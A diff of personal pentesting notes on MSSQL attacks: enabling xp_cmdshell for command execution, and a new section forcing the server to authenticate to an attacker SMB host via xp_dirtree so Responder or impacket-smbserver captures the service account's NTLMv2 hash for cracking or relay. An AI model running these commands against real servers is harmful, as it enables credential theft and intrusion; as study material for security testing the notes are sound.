@@ -16,19 +16,19 @@ GO
 - Weak & default `sa` credentials. Admins may forget to disable this account.
 ## XP_CMDSHELL
 If we have appropriate privileges, we can enable `xp_cmdshell`:
-```mssql
+```mysql
 -- To allow advanced options to be changed.  
-EXECUTE sp_configure 'show advanced options', 1
-GO
+> EXECUTE sp_configure 'show advanced options', 1
+
 -- To update the currently configured value for advanced options.  
-RECONFIGURE
-GO  
+> RECONFIGURE
+ 
 -- To enable the feature.  
-EXECUTE sp_configure 'xp_cmdshell', 1
-GO  
+> EXECUTE sp_configure 'xp_cmdshell', 1
+  
 -- To update the currently configured value for this feature.  
 RECONFIGURE
-GO
+
 ```
 There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). Or additional functionalities like the `xp_regwrite` command, used to elevate privileges by creating new entries in the Windows registry.
 # Write Local Files
@@ -62,6 +62,34 @@ There are other methods to get command execution, such as adding [extended stor
 2> GO
 ```
 # Capture Service Hash
+The undocumented stored procedures `xp_subdirs` and `xp_dirtree` uses SMB protocol to retrieve a list of child directories. We can use a stored procedure and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
+
+```mysql
+1> EXEC master..<xp_dirtree/xp_subdirs> '\\10.10.110.17\share\'
+2> GO
+```
+If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
+>Relay might not work on same host as Windows patched it for originating system.
+## SMB Servers
+### [[Responder]]
+```shell-session
+$ sudo responder -I tun0
+... SNIP ...
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab...SNIP...
+```
+### [[SMBServer]]
+```shell-session
+$ impacket-smbserver share ./ -smb2support
+... SNIP ...
+[*] Incoming connection (10.129.203.7,49728)
+[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
+[*] User WINSRV02\mssqlsvc authenticated successfully                        
+[*] demouser::WIN7BOX:5e3ab...SNIP...
+```
 # Impersonate Users
 >Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned.
 ## Identify Users to Impersonate
@@ -112,7 +140,7 @@ DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote
 # Clients
 Clients to access MSSQL:
 ### Linux
-- [[Impacket#MSSQLclient|Impacket-MSSQLclient]]
+- [[MSSQLclient|Impacket-MSSQLClient]]
 - [[sqsh]]
 - [[dbeaver]]
 - [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)
